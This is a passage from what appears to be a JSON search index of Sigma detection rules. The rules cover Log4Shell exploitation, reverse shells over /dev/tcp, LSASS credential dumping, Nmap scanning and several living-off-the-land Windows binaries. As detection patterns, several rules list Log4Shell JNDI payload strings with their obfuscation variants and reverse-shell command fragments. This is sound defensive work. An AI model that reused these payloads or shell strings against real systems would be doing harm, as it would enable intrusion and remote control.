https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md#atomic-test-2---system-network-connections-discovery-with-powershell Raw rule (edit) title: Use Get-NetTCPConnection id: b366adb4-d63d-422d-8a2c-186463b5ded0 status: experimental description: Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md#atomic-test-2---system-network-connections-discovery-with-powershell author: frack113 date: 2021/12/10 logsource: product: windows category: ps_classic_start definition: fields have to be extract from event detection: selection: HostApplication|contains: Get-NetTCPConnection condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1049 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_classic/posh_pc_susp_get_nettcpconnection.yml/","tags":["attack.discovery","attack.t1049"],"title":"Use Get-NetTCPConnection"},{"categories":null,"contents":"Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md#atomic-test-2---system-network-connections-discovery-with-powershell Raw rule (edit) title: Use Get-NetTCPConnection id: aff815cc-e400-4bf0-a47a-5d8a2407d4e1 status: experimental description: Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md#atomic-test-2---system-network-connections-discovery-with-powershell author: frack113 date: 2021/12/10 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection: ContextInfo|contains: \u0026#39;Get-NetTCPConnection\u0026#39; condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1049 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_module/posh_pm_susp_get_nettcpconnection.yml/","tags":["attack.discovery","attack.t1049"],"title":"Use Get-NetTCPConnection"},{"categories":null,"contents":"Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation\nKnown false-positives Legitimate python script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md#atomic-test-4---port-scan-using-python https://pypi.org/project/scapy/ Raw rule (edit) title: Python Initiated Connection id: bef0bc5a-b9ae-425d-85c6-7b2d705980c6 status: experimental description: Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md#atomic-test-4---port-scan-using-python - https://pypi.org/project/scapy/ date: 2021/12/10 logsource: category: network_connection product: windows detection: selection: Initiated: \u0026#39;true\u0026#39; Image|contains: python condition: selection falsepositives: - Legitimate python script level: high tags: - attack.discovery - attack.t1046 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/network_connection/net_connection_win_python.yml/","tags":["attack.discovery","attack.t1046"],"title":"Python Initiated Connection"},{"categories":null,"contents":"Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation\nKnown false-positives Network administator computeur References https://nmap.org/ https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md#atomic-test-3---port-scan-nmap-for-windows Raw rule (edit) title: Suspicious Nmap Execution id: f6ecd1cf-19b8-4488-97f6-00f0924991a3 status: experimental description: Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation author: frack113 references: - https://nmap.org/ - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md#atomic-test-3---port-scan-nmap-for-windows date: 2021/12/10 logsource: category: process_creation product: windows detection: nmap: OriginalFileName: nmap.exe condition: nmap falsepositives: - Network administator computeur level: high tags: - attack.discovery - attack.t1046 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_nmap.yml/","tags":["attack.discovery","attack.t1046"],"title":"Suspicious Nmap Execution"},{"categories":null,"contents":"Detects exploitation attempt against log4j RCE vulnerability reported as CVE-2021-44228 in different header fields found in web server logs (Log4Shell)\nKnown false-positives Vulnerability scanning References https://www.lunasec.io/docs/blog/log4j-zero-day/ https://news.ycombinator.com/item?id=29504755 https://github.com/tangxiaofeng7/apache-log4j-poc https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b https://github.com/YfryTchsGD/Log4jAttackSurface https://twitter.com/shutingrz/status/1469255861394866177?s=21 Raw rule (edit) title: Log4j RCE CVE-2021-44228 in Fields id: 9be472ed-893c-4ec0-94da-312d2765f654 status: experimental description: Detects exploitation attempt against log4j RCE vulnerability reported as CVE-2021-44228 in different header fields found in web server logs (Log4Shell) author: Florian Roth date: 2021/12/10 modified: 2022/02/06 references: - https://www.lunasec.io/docs/blog/log4j-zero-day/ - https://news.ycombinator.com/item?id=29504755 - https://github.com/tangxiaofeng7/apache-log4j-poc - https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b - https://github.com/YfryTchsGD/Log4jAttackSurface - https://twitter.com/shutingrz/status/1469255861394866177?s=21 tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection1: cs-User-Agent|contains: - \u0026#39;${jndi:ldap:/\u0026#39; - \u0026#39;${jndi:rmi:/\u0026#39; - \u0026#39;${jndi:ldaps:/\u0026#39; - \u0026#39;${jndi:dns:/\u0026#39; - \u0026#39;/$%7bjndi:\u0026#39; - \u0026#39;%24%7bjndi:\u0026#39; - \u0026#39;$%7Bjndi:\u0026#39; - \u0026#39;%2524%257Bjndi\u0026#39; - \u0026#39;%2F%252524%25257Bjndi%3A\u0026#39; - \u0026#39;${jndi:${lower:\u0026#39; - \u0026#39;${::-j}${\u0026#39; - \u0026#39;${jndi:nis\u0026#39; - \u0026#39;${jndi:nds\u0026#39; - \u0026#39;${jndi:corba\u0026#39; - \u0026#39;${jndi:iiop\u0026#39; - \u0026#39;Reference Class Name: foo\u0026#39; - \u0026#39;${${env:BARFOO:-j}\u0026#39; - \u0026#39;${::-l}${::-d}${::-a}${::-p}\u0026#39; - \u0026#39;${base64:JHtqbmRp\u0026#39; - \u0026#39;${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$\u0026#39; - \u0026#39;${${lower:j}ndi:\u0026#39; - \u0026#39;${${upper:j}ndi:\u0026#39; - \u0026#39;${${::-j}${::-n}${::-d}${::-i}:\u0026#39; selection2: user-agent|contains: - \u0026#39;${jndi:ldap:/\u0026#39; - \u0026#39;${jndi:rmi:/\u0026#39; - \u0026#39;${jndi:ldaps:/\u0026#39; - \u0026#39;${jndi:dns:/\u0026#39; - \u0026#39;/$%7bjndi:\u0026#39; - \u0026#39;%24%7bjndi:\u0026#39; - \u0026#39;$%7Bjndi:\u0026#39; - \u0026#39;%2524%257Bjndi\u0026#39; - \u0026#39;%2F%252524%25257Bjndi%3A\u0026#39; - \u0026#39;${jndi:${lower:\u0026#39; - \u0026#39;${::-j}${\u0026#39; - \u0026#39;${jndi:nis\u0026#39; - \u0026#39;${jndi:nds\u0026#39; - \u0026#39;${jndi:corba\u0026#39; - \u0026#39;${jndi:iiop\u0026#39; - \u0026#39;Reference Class Name: foo\u0026#39; - \u0026#39;${${env:BARFOO:-j}\u0026#39; - \u0026#39;${::-l}${::-d}${::-a}${::-p}\u0026#39; - \u0026#39;${base64:JHtqbmRp\u0026#39; - \u0026#39;${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$\u0026#39; - \u0026#39;${${lower:j}ndi:\u0026#39; - \u0026#39;${${upper:j}ndi:\u0026#39; - \u0026#39;${${::-j}${::-n}${::-d}${::-i}:\u0026#39; selection3: cs-uri|contains: - \u0026#39;${jndi:ldap:/\u0026#39; - \u0026#39;${jndi:rmi:/\u0026#39; - \u0026#39;${jndi:ldaps:/\u0026#39; - \u0026#39;${jndi:dns:/\u0026#39; - \u0026#39;/$%7bjndi:\u0026#39; - \u0026#39;%24%7bjndi:\u0026#39; - \u0026#39;$%7Bjndi:\u0026#39; - \u0026#39;%2524%257Bjndi\u0026#39; - \u0026#39;%2F%252524%25257Bjndi%3A\u0026#39; - \u0026#39;${jndi:${lower:\u0026#39; - \u0026#39;${::-j}${\u0026#39; - \u0026#39;${jndi:nis\u0026#39; - \u0026#39;${jndi:nds\u0026#39; - \u0026#39;${jndi:corba\u0026#39; - \u0026#39;${jndi:iiop\u0026#39; - \u0026#39;Reference Class Name: foo\u0026#39; - \u0026#39;${${env:BARFOO:-j}\u0026#39; - \u0026#39;${::-l}${::-d}${::-a}${::-p}\u0026#39; - \u0026#39;${base64:JHtqbmRp\u0026#39; - \u0026#39;${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$\u0026#39; - \u0026#39;${${lower:j}ndi:\u0026#39; - \u0026#39;${${upper:j}ndi:\u0026#39; - \u0026#39;${${::-j}${::-n}${::-d}${::-i}:\u0026#39; selection4: cs-referer|contains: - \u0026#39;${jndi:ldap:/\u0026#39; - \u0026#39;${jndi:rmi:/\u0026#39; - \u0026#39;${jndi:ldaps:/\u0026#39; - \u0026#39;${jndi:dns:/\u0026#39; - \u0026#39;/$%7bjndi:\u0026#39; - \u0026#39;%24%7bjndi:\u0026#39; - \u0026#39;$%7Bjndi:\u0026#39; - \u0026#39;%2524%257Bjndi\u0026#39; - \u0026#39;%2F%252524%25257Bjndi%3A\u0026#39; - \u0026#39;${jndi:${lower:\u0026#39; - \u0026#39;${::-j}${\u0026#39; - \u0026#39;${jndi:nis\u0026#39; - \u0026#39;${jndi:nds\u0026#39; - \u0026#39;${jndi:corba\u0026#39; - \u0026#39;${jndi:iiop\u0026#39; - \u0026#39;Reference Class Name: foo\u0026#39; - \u0026#39;${${env:BARFOO:-j}\u0026#39; - \u0026#39;${::-l}${::-d}${::-a}${::-p}\u0026#39; - \u0026#39;${base64:JHtqbmRp\u0026#39; - \u0026#39;${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$\u0026#39; - \u0026#39;${${lower:j}ndi:\u0026#39; - \u0026#39;${${upper:j}ndi:\u0026#39; - \u0026#39;${${::-j}${::-n}${::-d}${::-i}:\u0026#39; condition: 1 of selection* falsepositives: - Vulnerability scanning level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2021_44228_log4j_fields.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Log4j RCE CVE-2021-44228 in Fields"},{"categories":null,"contents":"Detects suspicious command with /dev/tcp\nKnown false-positives Unknown References https://www.andreafortuna.org/2021/03/06/some-useful-tips-about-dev-tcp/ https://book.hacktricks.xyz/shells/shells/linux https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md#atomic-test-1---port-scan Raw rule (edit) title: Suspicious Use of /dev/tcp id: 6cc5fceb-9a71-4c23-aeeb-963abe0b279c status: experimental description: Detects suspicious command with /dev/tcp author: frack113 references: - https://www.andreafortuna.org/2021/03/06/some-useful-tips-about-dev-tcp/ - https://book.hacktricks.xyz/shells/shells/linux - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md#atomic-test-1---port-scan date: 2021/12/10 modified: 2022/01/10 logsource: product: linux detection: keyword: - \u0026#39;cat \u0026lt;/dev/tcp/\u0026#39; - \u0026#39;exec 3\u0026lt;\u0026gt;/dev/tcp/\u0026#39; - \u0026#39;echo \u0026gt;/dev/tcp/\u0026#39; - \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026#39; - \u0026#39;sh -i \u0026gt;\u0026amp; /dev/udp/\u0026#39; - \u0026#39;0\u0026lt;\u0026amp;196;exec 196\u0026lt;\u0026gt;/dev/tcp/\u0026#39; - \u0026#39;exec 5\u0026lt;\u0026gt;/dev/tcp/\u0026#39; - \u0026#39;(sh)0\u0026gt;/dev/tcp/\u0026#39; - \u0026#39;bash -c \u0026#39;\u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026#39; - \u0026#39;echo -e \u0026#39;\u0026#39;#!/bin/bash\\nbash -i \u0026gt;\u0026amp; /dev/tcp/\u0026#39; condition: 1 of keyword falsepositives: - Unknown level: medium tags: - attack.reconnaissance ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_susp_dev_tcp.yml/","tags":["attack.reconnaissance"],"title":"Suspicious Use of /dev/tcp"},{"categories":null,"contents":"Detects exploitation attempt against log4j RCE vulnerability reported as CVE-2021-44228 (Log4Shell)\nKnown false-positives Vulnerability scanning References https://www.lunasec.io/docs/blog/log4j-zero-day/ https://news.ycombinator.com/item?id=29504755 https://github.com/tangxiaofeng7/apache-log4j-poc https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b https://github.com/YfryTchsGD/Log4jAttackSurface https://twitter.com/shutingrz/status/1469255861394866177?s=21 Raw rule (edit) title: Log4j RCE CVE-2021-44228 Generic id: 5ea8faa8-db8b-45be-89b0-151b84c82702 status: experimental description: Detects exploitation attempt against log4j RCE vulnerability reported as CVE-2021-44228 (Log4Shell) author: Florian Roth date: 2021/12/10 modified: 2022/02/06 references: - https://www.lunasec.io/docs/blog/log4j-zero-day/ - https://news.ycombinator.com/item?id=29504755 - https://github.com/tangxiaofeng7/apache-log4j-poc - https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b - https://github.com/YfryTchsGD/Log4jAttackSurface - https://twitter.com/shutingrz/status/1469255861394866177?s=21 tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: keywords: - \u0026#39;${jndi:ldap:/\u0026#39; - \u0026#39;${jndi:rmi:/\u0026#39; - \u0026#39;${jndi:ldaps:/\u0026#39; - \u0026#39;${jndi:dns:/\u0026#39; - \u0026#39;/$%7bjndi:\u0026#39; - \u0026#39;%24%7bjndi:\u0026#39; - \u0026#39;$%7Bjndi:\u0026#39; - \u0026#39;%2524%257Bjndi\u0026#39; - \u0026#39;%2F%252524%25257Bjndi%3A\u0026#39; - \u0026#39;${jndi:${lower:\u0026#39; - \u0026#39;${::-j}${\u0026#39; - \u0026#39;${jndi:nis\u0026#39; - \u0026#39;${jndi:nds\u0026#39; - \u0026#39;${jndi:corba\u0026#39; - \u0026#39;${jndi:iiop\u0026#39; - \u0026#39;Reference Class Name: foo\u0026#39; - \u0026#39;${${env:BARFOO:-j}\u0026#39; - \u0026#39;${::-l}${::-d}${::-a}${::-p}\u0026#39; - \u0026#39;${base64:JHtqbmRp\u0026#39; - \u0026#39;${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$\u0026#39; - \u0026#39;${${lower:j}ndi:\u0026#39; - \u0026#39;${${upper:j}ndi:\u0026#39; - \u0026#39;${${::-j}${::-n}${::-d}${::-i}:\u0026#39; filter: - \u0026#39;w.nessus.org/nessus\u0026#39; - \u0026#39;/nessus}\u0026#39; condition: keywords and not filter falsepositives: - Vulnerability scanning level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2021_44228_log4j.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Log4j RCE CVE-2021-44228 Generic"},{"categories":null,"contents":"utilizes REGSVR32.exe to execute this DLL masquerading as a Image file\nKnown false-positives unknown References https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/ https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html Raw rule (edit) title: Suspicious Regsvr32 Execution With Image Extension id: 089fc3d2-71e8-4763-a8a5-c97fbb0a403e status: experimental description: utilizes REGSVR32.exe to execute this DLL masquerading as a Image file references: - https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/ - https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html tags: - attack.defense_evasion - attack.t1218.010 author: frack113 date: 2021/11/29 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\regsvr32.exe\u0026#39; CommandLine|endswith: \u0026#39;.jpg\u0026#39; # can add other condition: selection falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_regsvr32_image.yml/","tags":["attack.defense_evasion","attack.t1218.010"],"title":"Suspicious Regsvr32 Execution With Image Extension"},{"categories":null,"contents":"Detects the use of NPPSpy hacktool that stores cleartext passwords of users that logged in to a local file\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md#atomic-test-2---credential-dumping-with-nppspy https://twitter.com/0gtweet/status/1465282548494487554 Raw rule (edit) title: NPPSpy Hacktool Usage id: cad1fe90-2406-44dc-bd03-59d0b58fe722 status: experimental description: Detects the use of NPPSpy hacktool that stores cleartext passwords of users that logged in to a local file author: Florian Roth references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md#atomic-test-2---credential-dumping-with-nppspy - https://twitter.com/0gtweet/status/1465282548494487554 date: 2021/11/29 tags: - attack.credential_access logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: - \u0026#39;\\NPPSpy.txt\u0026#39; - \u0026#39;\\NPPSpy.dll\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_hktl_nppspy.yml/","tags":["attack.credential_access"],"title":"NPPSpy Hacktool Usage"},{"categories":null,"contents":"Detects a suspicious process command line that uses whoami as first parameter (as e.g. used by EfsPotato)\nKnown false-positives Unknown References https://twitter.com/blackarrowsec/status/1463805700602224645?s=12 Raw rule (edit) title: WhoAmI as Parameter id: e9142d84-fbe0-401d-ac50-3e519fb00c89 status: experimental author: Florian Roth date: 2021/11/29 description: Detects a suspicious process command line that uses whoami as first parameter (as e.g. used by EfsPotato) references: - https://twitter.com/blackarrowsec/status/1463805700602224645?s=12 tags: - attack.discovery - attack.t1033 - car.2016-03-001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: \u0026#39;.exe whoami\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_whoami_as_param.yml/","tags":["attack.discovery","attack.t1033","car.2016-03-001"],"title":"WhoAmI as Parameter"},{"categories":null,"contents":"Detects attempts to discover the files with setuid/setgid capabilitiy on them. That would allow adversary to escalate their privileges.\nKnown false-positives None References https://man7.org/linux/man-pages/man8/getcap.8.html https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/ https://mn3m.info/posts/suid-vs-capabilities/ https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099 Raw rule (edit) title: Linux Capabilities Discovery id: fe10751f-1995-40a5-aaa2-c97ccb4123fe description: Detects attempts to discover the files with setuid/setgid capabilitiy on them. That would allow adversary to escalate their privileges. author: \u0026#39;Pawel Mazur\u0026#39; status: experimental date: 2021/11/28 references: - https://man7.org/linux/man-pages/man8/getcap.8.html - https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/ - https://mn3m.info/posts/suid-vs-capabilities/ - https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099 logsource: product: linux service: auditd detection: getcap: type: EXECVE a0: getcap a1: \u0026#39;-r\u0026#39; a2: \u0026#39;/\u0026#39; condition: getcap tags: - attack.collection - attack.privilege_escalation - attack.t1123 - attack.t1548 falsepositives: - None level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_capabilities_discovery.yml/","tags":["attack.collection","attack.privilege_escalation","attack.t1123","attack.t1548"],"title":"Linux Capabilities Discovery"},{"categories":null,"contents":"Detects process access to LSASS memory with suspicious access flags and from a suspicious folder\nKnown false-positives Legitimate software accessing LSASS process for legitimate reason References https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843\u0026amp;ithint=file%2cpptx\u0026amp;app=PowerPoint\u0026amp;authkey=!AMvCRTKB_V1J5ow https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf Raw rule (edit) title: LSASS Access from Program in Suspicious Folder id: fa34b441-961a-42fa-a100-ecc28c886725 status: experimental description: Detects process access to LSASS memory with suspicious access flags and from a suspicious folder author: Florian Roth date: 2021/11/27 modified: 2022/02/27 references: - https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights - https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843\u0026amp;ithint=file%2cpptx\u0026amp;app=PowerPoint\u0026amp;authkey=!AMvCRTKB_V1J5ow - https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment - http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf tags: - attack.credential_access - attack.t1003.001 - attack.s0002 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: \u0026#39;\\lsass.exe\u0026#39; GrantedAccess|endswith: - \u0026#39;10\u0026#39; - \u0026#39;30\u0026#39; - \u0026#39;50\u0026#39; - \u0026#39;70\u0026#39; - \u0026#39;90\u0026#39; - \u0026#39;B0\u0026#39; - \u0026#39;D0\u0026#39; - \u0026#39;F0\u0026#39; - \u0026#39;18\u0026#39; - \u0026#39;38\u0026#39; - \u0026#39;58\u0026#39; - \u0026#39;78\u0026#39; - \u0026#39;98\u0026#39; - \u0026#39;B8\u0026#39; - \u0026#39;D8\u0026#39; - \u0026#39;F8\u0026#39; - \u0026#39;1A\u0026#39; - \u0026#39;3A\u0026#39; - \u0026#39;5A\u0026#39; - \u0026#39;7A\u0026#39; - \u0026#39;9A\u0026#39; - \u0026#39;BA\u0026#39; - \u0026#39;DA\u0026#39; - \u0026#39;FA\u0026#39; - \u0026#39;0x14C2\u0026#39; # https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c - \u0026#39;FF\u0026#39; SourceImage|contains: - \u0026#39;\\Temp\\\u0026#39; - \u0026#39;\\Users\\Public\\\u0026#39; - \u0026#39;\\PerfLogs\\\u0026#39; - \u0026#39;\\AppData\\\u0026#39; - \u0026#39;\\Temporary\u0026#39; filter1: SourceImage|contains|all: - \u0026#39;C:\\Users\\\u0026#39; - \u0026#39;\\AppData\\Local\\\u0026#39; SourceImage|endswith: - \u0026#39;\\Microsoft VS Code\\Code.exe\u0026#39; - \u0026#39;\\software_reporter_tool.exe\u0026#39; - \u0026#39;\\DropboxUpdate.exe\u0026#39; - \u0026#39;\\MBAMInstallerService.exe\u0026#39; GrantedAccess: \u0026#39;0x410\u0026#39; filter_nextron: SourceImage|startswith: \u0026#39;C:\\Windows\\Temp\\asgard2-agent\\\u0026#39; SourceImage|endswith: - \u0026#39;\\thor64.exe\u0026#39; - \u0026#39;\\thor.exe\u0026#39; GrantedAccess: - \u0026#39;0x1fffff\u0026#39; - \u0026#39;0x1010\u0026#39; condition: selection and not 1 of filter* fields: - User - SourceImage - GrantedAccess falsepositives: - Legitimate software accessing LSASS process for legitimate reason level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_access/proc_access_win_susp_proc_access_lsass_susp_source.yml/","tags":["attack.credential_access","attack.t1003.001","attack.s0002"],"title":"LSASS Access from Program in Suspicious Folder"},{"categories":null,"contents":"Detects a suspicious LSASS process process clone that could be a sign of process dumping activity\nKnown false-positives Unknown References https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/ https://twitter.com/Hexacorn/status/1420053502554951689 https://twitter.com/SBousseaden/status/1464566846594691073?s=20 Raw rule (edit) title: Suspicious LSASS Process Clone id: c8da0dfd-4ed0-4b68-962d-13c9c884384e status: experimental description: Detects a suspicious LSASS process process clone that could be a sign of process dumping activity references: - https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/ - https://twitter.com/Hexacorn/status/1420053502554951689 - https://twitter.com/SBousseaden/status/1464566846594691073?s=20 tags: - attack.credential_access - attack.t1003 - attack.t1003.001 author: Florian Roth, Samir Bousseaden date: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\Windows\\System32\\lsass.exe\u0026#39; ParentImage|endswith: \u0026#39;\\Windows\\System32\\lsass.exe\u0026#39; condition: selection falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_lsass_clone.yml/","tags":["attack.credential_access","attack.t1003","attack.t1003.001"],"title":"Suspicious LSASS Process Clone"},{"categories":null,"contents":"Extract data from cab file and hide it in an alternate data stream\nKnown false-positives unknown References https://lolbas-project.github.io/lolbas/Binaries/Extrac32/ Raw rule (edit) title: Suspicious Extrac32 Alternate Data Stream Execution id: 4b13db67-0c45-40f1-aba8-66a1a7198a1e status: experimental description: Extract data from cab file and hide it in an alternate data stream references: - https://lolbas-project.github.io/lolbas/Binaries/Extrac32/ tags: - attack.defense_evasion - attack.t1564.004 author: frack113 date: 2021/11/26 logsource: category: process_creation product: windows detection: lolbas: CommandLine|contains|all: - extrac32.exe - .cab CommandLine|re: \u0026#39;:[^\\\\\\\\]\u0026#39; condition: lolbas falsepositives: - unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lolbas_extrac32_ads.yml/","tags":["attack.defense_evasion","attack.t1564.004"],"title":"Suspicious Extrac32 Alternate Data Stream Execution"},{"categories":null,"contents":"Detects when a user bypasses Defender by renaming a tool to dump64.exe and placing it in a Visual Studio folder\nKnown false-positives Dump64.exe in other folders than the excluded one References https://twitter.com/mrd0x/status/1460597833917251595 Raw rule (edit) title: Suspicious Dump64.exe Execution id: 129966c9-de17-4334-a123-8b58172e664d description: Detects when a user bypasses Defender by renaming a tool to dump64.exe and placing it in a Visual Studio folder status: experimental author: Austin Songer @austinsonger, Florian Roth date: 2021/11/26 references: - https://twitter.com/mrd0x/status/1460597833917251595 logsource: product: windows category: process_creation detection: selection: Image|endswith: \u0026#39;\\dump64.exe\u0026#39; procdump_flags: CommandLine|contains: - \u0026#39; -ma \u0026#39; - \u0026#39;accpeteula\u0026#39; filter: Image|contains: \u0026#39;\\Installer\\Feedback\\dump64.exe\u0026#39; condition: ( selection and not filter ) or ( selection and procdump_flags ) tags: - attack.credential_access - attack.t1003.001 falsepositives: - Dump64.exe in other folders than the excluded one level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_win_lolbas_dump64.yml/","tags":["attack.credential_access","attack.t1003.001"],"title":"Suspicious Dump64.exe Execution"},{"categories":null,"contents":"Upload file, credentials or data exfiltration with Binary part of Windows Defender\nKnown false-positives unknown References https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/ Raw rule (edit) title: Suspicious ConfigSecurityPolicy Execution id: 1f0f6176-6482-4027-b151-00071af39d7e status: experimental description: Upload file, credentials or data exfiltration with Binary part of Windows Defender references: - https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/ tags: - attack.exfiltration - attack.t1567 author: frack113 date: 2021/11/26 logsource: category: process_creation product: windows detection: lolbas: CommandLine|contains: ConfigSecurityPolicy.exe remote: CommandLine|contains: - \u0026#39;https://\u0026#39; - \u0026#39;http://\u0026#39; - \u0026#39;ftp://\u0026#39; condition: lolbas and remote falsepositives: - unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lolbas_configsecuritypolicy.yml/","tags":["attack.exfiltration","attack.t1567"],"title":"Suspicious ConfigSecurityPolicy Execution"},{"categories":null,"contents":"Compress taget file into a cab file stored in the Alternate Data Stream (ADS) of the target file.\nKnown false-positives Very Possible References https://lolbas-project.github.io/lolbas/Binaries/Diantz/ Raw rule (edit) title: Suspicious Diantz Alternate Data Stream Execution id: 6b369ced-4b1d-48f1-b427-fdc0de0790bd status: experimental description: Compress taget file into a cab file stored in the Alternate Data Stream (ADS) of the target file. references: - https://lolbas-project.github.io/lolbas/Binaries/Diantz/ tags: - attack.defense_evasion - attack.t1564.004 author: frack113 date: 2021/11/26 logsource: category: process_creation product: windows detection: lolbas: CommandLine|contains|all: - diantz.exe - .cab CommandLine|re: \u0026#39;:[^\\\\\\\\]\u0026#39; condition: lolbas falsepositives: - Very Possible level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lolbas_diantz_ads.yml/","tags":["attack.defense_evasion","attack.t1564.004"],"title":"Suspicious Diantz Alternate Data Stream Execution"},{"categories":null,"contents":"Download and compress a remote file and store it in a cab file on local machine.\nKnown false-positives unknown References https://lolbas-project.github.io/lolbas/Binaries/Diantz/ Raw rule (edit) title: Suspicious Diantz Download and Compress Into a CAB File id: 185d7418-f250-42d0-b72e-0c8b70661e93 status: experimental description: Download and compress a remote file and store it in a cab file on local machine. references: - https://lolbas-project.github.io/lolbas/Binaries/Diantz/ tags: - attack.command_and_control - attack.t1105 author: frack113 date: 2021/11/26 logsource: category: process_creation product: windows detection: lolbas: CommandLine|contains|all: - diantz.exe - \u0026#39; \\\\\u0026#39; - \u0026#39;.cab\u0026#39; condition: lolbas falsepositives: - unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lolbas_diantz_remote_cab.yml/","tags":["attack.command_and_control","attack.t1105"],"title":"Suspicious Diantz Download and Compress Into a CAB 